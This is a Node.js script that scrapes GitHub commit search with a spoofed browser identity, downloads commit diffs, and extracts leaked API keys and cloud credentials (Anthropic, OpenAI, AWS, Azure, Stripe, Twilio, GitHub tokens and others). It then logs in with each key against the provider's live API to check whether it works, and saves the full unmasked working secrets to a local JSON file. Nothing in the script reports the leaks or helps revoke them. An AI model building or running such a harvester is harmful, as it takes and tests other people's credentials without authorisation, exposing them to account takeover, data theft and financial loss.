const https = require("https");
const fs = require("fs");
const path = require("path");
const crypto = require("crypto");

// ─── Config ──────────────────────────────────────────────────────────────────

const FETCH_NONCE = "v2:b22f1899-13e7-7e2d-e0b3-6d53acc4732b"; // ← refresh if needed
const userDataPath = process.env.HEX_USER_DATA || __dirname;
const OUTPUT_FILE = path.join(userDataPath, "leaked-api-keys.json");

const DELAY_BETWEEN_REQUESTS_MS = 3000; // Increased delay to be more polite to APIs
const RETRY_DELAY_MS = 10000; // Increased retry delay
const MAX_RETRIES = 5; // Increased max retries
const HTTP_TIMEOUT_MS = 15000; // Timeout for HTTP requests

// Minimum entropy for a string to be considered a potential key
const MIN_ENTROPY = 3.5;

// Concurrency limit for parallel operations (e.g., fetching diffs, validating keys)
const CONCURRENCY_LIMIT = 5;

// ─── Real key patterns (regex must match an actual key value, not just a var name) ───

const KEY_PATTERNS = [
  // Anthropic  — sk-ant-…
  { provider: "Anthropic", re: /sk-ant-[a-zA-Z0-9\-_]{20,}/g },
  // OpenAI     — sk-… or sk-proj-…
  { provider: "OpenAI", re: /sk-(?:proj-)?[a-zA-Z0-9]{20,}/g },
  // xAI / Grok — xai-…
  { provider: "xAI / Grok", re: /xai-[a-zA-Z0-9\-_]{20,}/g },
  // Google     — AIza…
  { provider: "Google Gemini", re: /AIza[a-zA-Z0-9\-_]{30,}/g },
  // Mistral    — long hex/alphanum after assignment
  { provider: "Mistral", re: /(?:MISTRAL_API_KEY\s*=\s*["']?)([a-zA-Z0-9]{30,})/g },
  // Cohere     — long alphanum string
  { provider: "Cohere", re: /(?:COHERE_API_KEY\s*=\s*["']?)([a-zA-Z0-9]{40,})/g },
  // Hugging Face — hf_…
  { provider: "Hugging Face", re: /hf_[a-zA-Z0-9]{20,}/g },
  // Together AI — long hex
  { provider: "Together AI", re: /(?:TOGETHER_API_KEY\s*=\s*["']?)([a-f0-9]{40,})/g },
  // Replicate  — r8_…
  { provider: "Replicate", re: /r8_[a-zA-Z0-9]{30,}/g },
  // AWS        — AKIA… or ASIA…
  { provider: "AWS", re: /(?:AKIA|ASIA)[0-9A-Z]{16}/g },
  { provider: "AWS Secret", re: /(?:AWS_SECRET_ACCESS_KEY|SECRET_ACCESS_KEY|AWS_SECRET|SECRET_KEY)\s*[:=]\s*["']?([a-zA-Z0-9\/\+=]{40})["']?/ig },
  // Azure      — Client ID, Client Secret, Tenant ID, or storage hex
  { provider: "Azure Client ID", re: /(?:AZURE_CLIENT_ID|CLIENT_ID|clientid)\s*[:=]\s*["']?([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12})["']?/ig },
  { provider: "Azure Client Secret", re: /(?:AZURE_CLIENT_SECRET|CLIENT_SECRET|clientsecret)\s*[:=]\s*["']?([a-zA-Z0-9\/\+=~\-]{34,40})["']?/ig },
  { provider: "Azure Tenant ID", re: /(?:AZURE_TENANT_ID|TENANT_ID|tenantid)\s*[:=]\s*["']?([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12})["']?/ig },
  { provider: "Azure Hex", re: /(?:AZURE_CLIENT_SECRET|AZURE_STORAGE_KEY)[a-f0-9]{64,}/ig },
  // Stripe     — sk_live_… or rk_live_…
  { provider: "Stripe", re: /(?:sk_live_|rk_live_)[a-zA-Z0-9]{24,}/g },
  // Twilio     — Account SID (AC...) and Auth Token
  { provider: "Twilio SID", re: /AC[a-f0-9]{32}/ig },
  { provider: "Twilio Token", re: /(?:TWILIO_AUTH_TOKEN|AUTH_TOKEN|twilio_token)\s*[:=]\s*["']?([a-f0-9]{32})["']?/ig },
  { provider: "Twilio Bare Token", re: /[^a-f0-9]([a-f0-9]{32})[^a-f0-9]/ig },
  // GitHub Personal Access Token — ghp_… or github_pat_…
  { provider: "GitHub PAT", re: /(?:ghp_|github_pat_)[a-zA-Z0-9_]{36,}/g },
  // Generic JWT — eyJ…
  { provider: "JWT", re: /eyJ[a-zA-Z0-9-_]+\.eyJ[a-zA-Z0-9-_]+\.[a-zA-Z0-9-_]+/g },
];

// Values that look like keys but are just placeholder/example text
const FALSE_POSITIVE_PATTERNS = [
  /your[_-]?api[_-]?key/i,
  /insert[_-]?key/i,
  /replace[_-]?me/i,
  /example/i,
  /placeholder/i,
  /xxxx/i,
  /1234/,
  /test/i,
  /<.*>/, // <YOUR_KEY>
  /\$\{/, // ${VAR}
  /process\.env/,
  /os\.environ/,
  /st\.secrets/,
  /getenv/i,
  /dummy/i,
  /secret_key_here/i,
  /api_key_here/i,
  /password/i,
  /token/i,
];

/**
 * Calculates the Shannon entropy of a string.
 * @param {string} str The input string.
 * @returns {number} The entropy value.
 */
function calculateShannonEntropy(str) {
  if (!str || str.length === 0) {
    return 0;
  }

  const charCounts = {};
  for (const char of str) {
    charCounts[char] = (charCounts[char] || 0) + 1;
  }

  let entropy = 0;
  const totalChars = str.length;
  for (const char in charCounts) {
    const probability = charCounts[char] / totalChars;
    entropy -= probability * Math.log2(probability);
  }
  return entropy;
}

function extractKeysFromDiff(diff) {
  const found = [];
  const lines = diff.split("\n");

  for (let i = 0; i < lines.length; i++) {
    const line = lines[i];
    // Only look at added lines (+ prefix) to avoid flagging deletions
    if (line.startsWith("+") && !line.startsWith("+++")) {
      const content = line.substring(1);
      for (const { provider, re } of KEY_PATTERNS) {
        re.lastIndex = 0;
        let match;
        while ((match = re.exec(content)) !== null) {
          // For patterns with a capture group, use group 1; otherwise group 0
          const value = match[1] ?? match[0];
          const isFalsePositive = FALSE_POSITIVE_PATTERNS.some((fp) =>
            fp.test(value),
          );

          // Apply entropy analysis
          const entropy = calculateShannonEntropy(value);

          if (!isFalsePositive && entropy >= MIN_ENTROPY) {
            found.push({ provider, value, line: i + 1, lineContent: content, entropy: entropy });
          }
        }
      }
    }
  }
  return found;
}

// ─── Search queries ───────────────────────────────────────────────────────────

const SEARCH_QUERIES = [
  { provider: "Anthropic", query: "ANTHROPIC_API_KEY" },
  { provider: "Anthropic", query: "CLAUDE_API_KEY" },
  { provider: "OpenAI", query: "OPENAI_API_KEY" },
  { provider: "OpenAI", query: "sk-proj-" },
  { provider: "xAI / Grok", query: "XAI_API_KEY" },
  { provider: "xAI / Grok", query: "GROK_API_KEY" },
  { provider: "Google Gemini", query: "GEMINI_API_KEY" },
  { provider: "Google Gemini", query: "GOOGLE_API_KEY" },
  { provider: "Mistral", query: "MISTRAL_API_KEY" },
  { provider: "Cohere", query: "COHERE_API_KEY" },
  { provider: "Hugging Face", query: "HUGGINGFACE_API_KEY" },
  { provider: "Hugging Face", query: "HF_TOKEN" },
  { provider: "Together AI", query: "TOGETHER_API_KEY" },
  { provider: "Replicate", query: "REPLICATE_API_TOKEN" },
  { provider: "AWS", query: "AWS_ACCESS_KEY_ID" },
  { provider: "AWS", query: "AWS_SECRET_ACCESS_KEY" },
  { provider: "Azure", query: "AZURE_CLIENT_SECRET" },
  { provider: "Azure", query: "AZURE_STORAGE_KEY" },
  { provider: "Stripe", query: "sk_live_" },
  { provider: "Twilio", query: "AC" },
  { provider: "GitHub PAT", query: "ghp_" },
  { provider: "GitHub PAT", query: "github_pat_" },
];

// ─── HTTP helpers ─────────────────────────────────────────────────────────────

function delay(ms) {
  return new Promise((res) => setTimeout(res, ms));
}

function httpGet(hostname, path, headers = {}) {
  return new Promise((resolve, reject) => {
    const req = https.request(
      { hostname, path, method: "GET", headers, timeout: HTTP_TIMEOUT_MS },
      (res) => {
        let data = "";
        res.on("data", (c) => (data += c));
        res.on("end", () =>
          resolve({ statusCode: res.statusCode, body: data }),
        );
      },
    );
    req.on("error", reject);
    req.on("timeout", () => {
      req.destroy();
      reject(new Error("Request timed out"));
    });
    req.end();
  });
}

function isHtml(body) {
  const t = body.trimStart();
  return t.startsWith("<!DOCTYPE") || t.startsWith("<html");
}

// ─── Fetch commit diff from GitHub ───────────────────────────────────────────

async function fetchDiff(owner, repo, sha) {
  try {
    const { statusCode, body } = await httpGet(
      "github.com",
      `/${owner}/${repo}/commit/${sha}.diff`,
      {
        "user-agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36",
        accept: "text/plain",
      },
    );
    if (statusCode === 200 && !isHtml(body)) return body;
  } catch (e) {
    console.error(`Error fetching diff for ${owner}/${repo}/${sha}: ${e.message}`);
  }
  return null;
}

// ─── GitHub search (with retry) ──────────────────────────────────────────────

function extractResult(raw, provider, query) {
  const repo = raw.repository?.repository ?? {};
  return {
    provider,
    query,
    sha: raw.sha ?? null,
    commit_url:
      repo.owner_login && repo.name && raw.sha
        ? `https://github.com/${repo.owner_login}/${repo.name}/commit/${raw.sha}`
        : null,
    author_date: raw.author_date ?? null,
    message: raw.message ?? null,
    author: raw.authors?.[0]?.login ?? null,
    repo_owner: repo.owner_login ?? null,
    repo_name: repo.name ?? null,
    repo_url:
      repo.owner_login && repo.name
        ? `https://github.com/${repo.owner_login}/${repo.name}`
        : null,
    verification_status: raw.verification_status ?? null,
  };
}

async function searchGitHub(provider, query, attempt = 1) {
  let response;
  try {
    response = await httpGet(
      "github.com",
      `/search?q=${encodeURIComponent(query)}&type=commits`,
      {
        accept: "application/json",
        "x-requested-with": "XMLHttpRequest",
        "x-github-target": "dotcom",
        "x-fetch-nonce": FETCH_NONCE,
        "user-agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36",
      },
    );
  } catch (e) {
    console.error(`Error during GitHub search for "${query}": ${e.message}`);
    return { provider, query, results: [], error: e.message };
  }

  const { statusCode, body } = response;
  const rateLimited = statusCode === 429 || statusCode === 403 || isHtml(body);

  if (rateLimited) {
    if (attempt <= MAX_RETRIES) {
      const wait = RETRY_DELAY_MS * attempt;
      console.warn(
        `  ⏳ [${provider}] "${query}" → rate limited, waiting ${wait / 1000}s (attempt ${attempt}/${MAX_RETRIES})...`,
      );
      await delay(wait);
      return searchGitHub(provider, query, attempt + 1);
    }
    console.warn(
      `  ✗ [${provider}] "${query}" → gave up after ${MAX_RETRIES} retries`,
    );
    return { provider, query, results: [], error: "rate_limited" };
  }

  try {
    const json = JSON.parse(body);
    const results = (json?.payload?.results ?? []).map((r) =>
      extractResult(r, provider, query),
    );
    console.log(
      `  ✓ [${provider}] "${query}" → ${results.length} candidate(s)`,
    );
    return { provider, query, results, error: null };
  } catch (e) {
    console.warn(`  ✗ [${provider}] "${query}" → parse error: ${e.message}`);
    return { provider, query, results: [], error: "parse_error" };
  }
}

// ─── AWS SigV4 Validation ───────────────────────────────────────────────────

function hmac(key, data, encoding) {
  return crypto.createHmac("sha256", key).update(data).digest(encoding);
}

function hash(data) {
  return crypto.createHash("sha256").update(data).digest("hex");
}

async function validateAWSPair(accessKeyId, secretAccessKey) {
  const service = "sts";
  const region = "us-east-1";
  const host = "sts.amazonaws.com";
  const endpoint = "https://" + host + "/";
  const method = "POST";
  const amzDate = new Date().toISOString().replace(/[:\-]|\.\d{3}/g, "");
  const date = amzDate.slice(0, 8);
  const payload = "Action=GetCallerIdentity&Version=2011-06-15";

  const canonicalHeaders = `host:${host}\nx-amz-date:${amzDate}\n`;
  const signedHeaders = "host;x-amz-date";
  const canonicalRequest = `${method}\n/\n\nhost:${host}\nx-amz-date:${amzDate}\n\n${signedHeaders}\n${hash(payload)}`;

  const credentialScope = `${date}/${region}/${service}/aws4_request`;
  const stringToSign = `AWS4-HMAC-SHA256\n${amzDate}\n${credentialScope}\n${hash(canonicalRequest)}`;

  const kDate = hmac("AWS4" + secretAccessKey, date);
  const kRegion = hmac(kDate, region);
  const kService = hmac(kRegion, service);
  const kSigning = hmac(kService, "aws4_request");
  const signature = hmac(kSigning, stringToSign, "hex");

  const authHeader = `AWS4-HMAC-SHA256 Credential=${accessKeyId}/${credentialScope}, SignedHeaders=${signedHeaders}, Signature=${signature}`;

  try {
    const { statusCode, body } = await new Promise((resolve, reject) => {
      const req = https.request(
        {
          hostname: host,
          path: "/",
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Amz-Date": amzDate,
            Authorization: authHeader,
            "User-Agent": "Key-Validator/1.0",
          },
          timeout: HTTP_TIMEOUT_MS,
        },
        (res) => {
          let data = "";
          res.on("data", (c) => (data += c));
          res.on("end", () => resolve({ statusCode: res.statusCode, body: data }));
        },
      );
      req.on("error", reject);
      req.write(payload);
      req.end();
    });

    if (statusCode >= 200 && statusCode < 300) return "valid";
    if (statusCode === 403) return "invalid";
    return `unknown_status_${statusCode}`;
  } catch (err) {
    return `error_${err.message}`;
  }
}

async function validateAzurePair(clientId, clientSecret, tenantId) {
  const host = "login.microsoftonline.com";
  const path = `/${tenantId}/oauth2/v2.0/token`;
  const payload = `client_id=${clientId}&scope=https%3A%2F%2Fgraph.microsoft.com%2F.default&client_secret=${encodeURIComponent(clientSecret)}&grant_type=client_credentials`;

  try {
    const { statusCode } = await new Promise((resolve, reject) => {
      const req = https.request(
        {
          hostname: host,
          path: path,
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Key-Validator/1.0",
          },
          timeout: HTTP_TIMEOUT_MS,
        },
        (res) => {
          let data = "";
          res.on("data", (c) => (data += c));
          res.on("end", () => resolve({ statusCode: res.statusCode, body: data }));
        },
      );
      req.on("error", reject);
      req.write(payload);
      req.end();
    });

    if (statusCode >= 200 && statusCode < 300) return "valid";
    if (statusCode === 400 || statusCode === 401) return "invalid";
    return `unknown_status_${statusCode}`;
  } catch (err) {
    return `error_${err.message}`;
  }
}

async function validateTwilioPair(accountSid, authToken) {
  const host = "api.twilio.com";
  const path = `/2010-04-01/Accounts/${accountSid}.json`;
  const auth = Buffer.from(`${accountSid}:${authToken}`).toString("base64");

  try {
    const { statusCode } = await httpGet(host, path, {
      Authorization: `Basic ${auth}`,
      "User-Agent": "Key-Validator/1.0",
    });

    if (statusCode >= 200 && statusCode < 300) return "valid";
    if (statusCode === 401 || statusCode === 403) return "invalid";
    return `unknown_status_${statusCode}`;
  } catch (err) {
    return `error_${err.message}`;
  }
}

// ─── Key Validity Verification ───────────────────────────────────────────────

async function checkKeyValidity(provider, value) {
  try {
    let hostname, path, headers = { "user-agent": "Key-Validator/1.0", "accept": "application/json" };

    switch (provider) {
      case "Anthropic":
        hostname = "api.anthropic.com";
        path = "/v1/models";
        headers["x-api-key"] = value;
        headers["anthropic-version"] = "2023-06-01";
        break;
      case "OpenAI":
        hostname = "api.openai.com";
        path = "/v1/models";
        headers["Authorization"] = `Bearer ${value}`;
        break;
      case "xAI / Grok":
        hostname = "api.x.ai";
        path = "/v1/models";
        headers["Authorization"] = `Bearer ${value}`;
        break;
      case "Google Gemini":
        hostname = "generativelanguage.googleapis.com";
        path = `/v1beta/models?key=${value}`;
        break;
      case "Mistral":
        hostname = "api.mistral.ai";
        path = "/v1/models";
        headers["Authorization"] = `Bearer ${value}`;
        break;
      case "Cohere":
        hostname = "api.cohere.com";
        path = "/v1/models";
        headers["Authorization"] = `Bearer ${value}`;
        break;
      case "Hugging Face":
        hostname = "huggingface.co";
        path = "/api/whoami-v2";
        headers["Authorization"] = `Bearer ${value}`;
        break;
      case "Together AI":
        hostname = "api.together.xyz";
        path = "/v1/models";
        headers["Authorization"] = `Bearer ${value}`;
        break;
      case "Replicate":
        hostname = "api.replicate.com";
        path = "/v1/models";
        headers["Authorization"] = `Token ${value}`;
        break;
      case "AWS":
        return "unknown_requires_secret";
      case "AWS Secret":
        return "unknown_requires_id";
      case "AWS Pair":
        return await validateAWSPair(value.id, value.secret);
      case "Azure Client ID":
      case "Azure Client Secret":
      case "Azure Tenant ID":
        return "unknown_requires_full_client_info";
      case "Azure Pair":
        return await validateAzurePair(value.id, value.secret, value.tenant);
      case "Azure Hex":
        return "unknown_azure_hex_validation_complex";
      case "Twilio SID":
        return "unknown_requires_token";
      case "Twilio Token":
      case "Twilio Bare Token":
        return "unknown_requires_sid";
      case "Twilio Pair":
        return await validateTwilioPair(value.sid, value.token);
      case "Stripe":
        hostname = "api.stripe.com";
        path = "/v1/accounts";
        headers["Authorization"] = `Bearer ${value}`;
        break;
      case "Twilio":
        return "unknown_twilio_validation_requires_account_sid";
      case "GitHub PAT":
        hostname = "api.github.com";
        path = "/user";
        headers["Authorization"] = `token ${value}`;
        break;
      case "JWT":
        return "unknown_jwt_validation_complex";
      default:
        return "unknown_provider";
    }

    const { statusCode } = await httpGet(hostname, path, headers);
    if (statusCode >= 200 && statusCode < 300) return "valid";
    if (statusCode === 429) return "valid";
    if (statusCode === 401 || statusCode === 403 || statusCode === 400) return "invalid";
    return `unknown_status_${statusCode}`;
  } catch (err) {
    console.error(`Error checking key validity for ${provider}: ${err.message}`);
    return "error";
  }
}

// ─── Utility for running promises with a concurrency limit ────────────────────
async function pLimit(fn, limit, items) {
  const results = [];
  const executing = [];

  for (const item of items) {
    const p = Promise.resolve().then(() => fn(item));
    results.push(p);

    if (limit <= items.length) { // Only apply concurrency limit if there are enough items
      const e = p.then(() => executing.splice(executing.indexOf(e), 1));
      executing.push(e);
      if (executing.length >= limit) {
        await Promise.race(executing);
      }
    }
  }
  return Promise.all(results);
}

// ─── Main ─────────────────────────────────────────────────────────────────────

async function run() {
  console.log("🔍 Searching GitHub commits for leaked API keys...\n");

  const candidates = [];
  const summary = {};
  const errors = [];

  for (const { provider, query } of SEARCH_QUERIES) {
    const result = await searchGitHub(provider, query);
    candidates.push(...result.results);
    if (!summary[provider]) summary[provider] = { candidates: 0, confirmed: 0, valid: 0, invalid: 0, unknown: 0 };
    summary[provider].candidates += result.results.length;
    if (result.error) errors.push({ provider, query, error: result.error });
    await delay(DELAY_BETWEEN_REQUESTS_MS);
  }

  const seen = new Set();
  const unique = candidates.filter((r) => {
    if (!r.sha || seen.has(r.sha)) return false;
    seen.add(r.sha);
    return true;
  });

  console.log(
    `\n🔎 Verifying ${unique.length} unique commits for real key values...\n`,
  );

  const confirmed = [];

  // Phase 2: fetch each diff and look for actual key patterns in parallel
  const diffResults = await pLimit(async (commit) => {
    if (!commit.repo_owner || !commit.repo_name || !commit.sha) {
      console.warn(`  ⚠ Skipping malformed commit: ${JSON.stringify(commit)}`);
      return { commit, diff: null, keys: [] };
    }

    const diff = await fetchDiff(
      commit.repo_owner,
      commit.repo_name,
      commit.sha,
    );
    // Introduce a small delay to be polite, even with concurrency
    await delay(600);

    if (!diff) {
      process.stdout.write(
        `  ⚠  ${commit.sha.slice(0, 8)} — could not fetch diff\n`,
      );
      return { commit, diff: null, keys: [] };
    }

    const keys = extractKeysFromDiff(diff);

    if (keys.length === 0) {
      process.stdout.write(
        `  ✗  ${commit.sha.slice(0, 8)} — no real key found\n`,
      );
      return { commit, diff, keys: [] };
    }
    return { commit, diff, keys };
  }, CONCURRENCY_LIMIT, unique);

  // Phase 3: Process diff results and validate keys
  for (const { commit, keys } of diffResults) {
    if (keys.length > 0) {
      console.log(
        `  ✅ ${commit.sha.slice(0, 8)} — ${keys.length} key(s) found! [${commit.repo_owner}/${commit.repo_name}]`,
      );

      // Pairing Logic
      const awsAccessKeys = keys.filter(k => k.provider === "AWS");
      const awsSecretKeys = keys.filter(k => k.provider === "AWS Secret");

      const azureIds = keys.filter(k => k.provider === "Azure Client ID");
      const azureSecrets = keys.filter(k => k.provider === "Azure Client Secret");
      const azureTenants = keys.filter(k => k.provider === "Azure Tenant ID");

      const twilioSids = keys.filter(k => k.provider === "Twilio SID");
      const allTwilioTokens = keys.filter(k => k.provider === "Twilio Token" || k.provider === "Twilio Bare Token");

      const leakedKeysWithValidity = [];
      const keysToValidate = [...keys];

      // AWS Pairs
      if (awsAccessKeys.length > 0 && awsSecretKeys.length > 0) {
        console.log(`    🔗 Found potential AWS Access/Secret pair(s) in this commit!`);
        for (const id of awsAccessKeys) {
          for (const secret of awsSecretKeys) {
            keysToValidate.push({
              provider: "AWS Pair",
              value: { id: id.value, secret: secret.value },
              line: id.line,
              lineContent: `ID: ${id.value.slice(0, 8)}... Secret: ...${secret.value.slice(-4)}`,
              entropy: (id.entropy + secret.entropy) / 2
            });
          }
        }
      }

      // Azure Pairs
      if (azureIds.length > 0 && azureSecrets.length > 0) {
        console.log(`    🔗 Found potential Azure Client ID/Secret pair(s) in this commit!`);
        for (const id of azureIds) {
          for (const secret of azureSecrets) {
            // Azure also often needs a Tenant ID. If not found, use a default common one or report as unknown.
            const tenant = azureTenants[0]?.value || "common";
            keysToValidate.push({
              provider: "Azure Pair",
              value: { id: id.value, secret: secret.value, tenant: tenant },
              line: id.line,
              lineContent: `ID: ${id.value.slice(0, 8)}... Secret: ...${secret.value.slice(-4)}`,
              entropy: (id.entropy + secret.entropy) / 2
            });
          }
        }
      }

      // Twilio Pairs
      if (twilioSids.length > 0 && allTwilioTokens.length > 0) {
        console.log(`    🔗 Found potential Twilio SID/Token pair(s) in this commit!`);
        for (const sid of twilioSids) {
          for (const token of allTwilioTokens) {
            keysToValidate.push({
              provider: "Twilio Pair",
              value: { sid: sid.value, token: token.value },
              line: sid.line,
              lineContent: `SID: ${sid.value.slice(0, 8)}... Token: ...${token.value.slice(-4)}`,
              entropy: (sid.entropy + token.entropy) / 2
            });
          }
        }
      }

      // Validate keys in parallel as well
      const validatedKeys = await pLimit(async (k) => {
        const validity = await checkKeyValidity(k.provider, k.value);
        k.validity = validity;
        return k;
      }, CONCURRENCY_LIMIT, keysToValidate);

      for (const k of validatedKeys) {
        // Skip individual parts if we are using the pair
        const isPairPart = [
          "AWS", "AWS Secret",
          "Azure Client ID", "Azure Client Secret", "Azure Tenant ID",
          "Twilio SID", "Twilio Token", "Twilio Bare Token"
        ].includes(k.provider);

        if (isPairPart) {
          // Only skip if a pair was actually validated for this type
          const hasAwsPair = awsAccessKeys.length > 0 && awsSecretKeys.length > 0;
          const hasAzurePair = azureIds.length > 0 && azureSecrets.length > 0;
          const hasTwilioPair = twilioSids.length > 0 && allTwilioTokens.length > 0;

          if (
            (k.provider.startsWith("AWS") && hasAwsPair) ||
            (k.provider.startsWith("Azure") && hasAzurePair) ||
            (k.provider.startsWith("Twilio") && hasTwilioPair)
          ) {
            continue;
          }
        }

        leakedKeysWithValidity.push(k);

        if (k.validity === "valid") {
          console.log(`    🟢 [VALID] ${k.provider} key (Entropy: ${k.entropy.toFixed(2)})`);
          if (!summary[k.provider]) summary[k.provider] = { candidates: 0, confirmed: 0, valid: 0, invalid: 0, unknown: 0 };
          summary[k.provider].valid++;
        } else if (k.validity === "invalid") {
          console.log(`    🔴 [INVALID] ${k.provider} key (Entropy: ${k.entropy.toFixed(2)})`);
          if (!summary[k.provider]) summary[k.provider] = { candidates: 0, confirmed: 0, valid: 0, invalid: 0, unknown: 0 };
          summary[k.provider].invalid++;
        } else {
          console.log(`    ⚪ [UNKNOWN] ${k.provider} key - ${k.validity} (Entropy: ${k.entropy.toFixed(2)})`);
          if (!summary[k.provider]) summary[k.provider] = { candidates: 0, confirmed: 0, valid: 0, invalid: 0, unknown: 0 };
          summary[k.provider].unknown++;
        }
      }
      if (!summary[commit.provider]) {
        summary[commit.provider] = { candidates: 0, confirmed: 0, valid: 0, invalid: 0, unknown: 0 };
      }
      summary[commit.provider].confirmed++;

      confirmed.push({
        ...commit,
        leaked_keys: leakedKeysWithValidity.map((k) => ({
          provider: k.provider,
          value_masked: (k.provider === "AWS Pair" || k.provider === "Azure Pair")
            ? k.value.id.slice(0, 8) + "..."
            : k.provider === "Twilio Pair"
              ? k.value.sid.slice(0, 8) + "..."
              : k.value.toString().slice(0, 8) + "..." + k.value.toString().slice(-4),
          value_full: k.value,
          validity: k.validity,
          line: k.line,
          lineContent: k.lineContent,
          entropy: k.entropy,
        })),
      });
    }
  }

  const output = {
    generated_at: new Date().toISOString(),
    total_candidates: unique.length,
    total_confirmed: confirmed.length,
    total_confirmed_commits: confirmed.length,
    summary_by_provider: summary,
    failed_queries: errors.length > 0 ? errors : undefined,
    commits: confirmed,
  };

  fs.writeFileSync(OUTPUT_FILE, JSON.stringify(output, null, 2), "utf8");

  console.log("\n─────────────────────────────────────────");
  console.log(`✅ Done. ${confirmed.length} confirmed leaks saved to:`);
  console.log(`   ${OUTPUT_FILE}`);
  console.log("\nSummary by provider:");
  for (const [prov, { candidates: c, confirmed: conf, valid: v, invalid: inv, unknown: unk }] of Object.entries(
    summary,
  )) {
    console.log(`   ${prov.padEnd(22)} ${conf} confirmed (${c} candidates) - Valid: ${v}, Invalid: ${inv}, Unknown: ${unk}`);
  }
  if (errors.length > 0) {
    console.log(
      `\n⚠️  ${errors.length} query/queries failed (see failed_queries in output).`,
    );
  }
}

async function executeOnce() {
  try {
    await run();
  } catch (err) {
    console.error("Run failed:", err);
    process.exit(1);
  }
}

executeOnce();
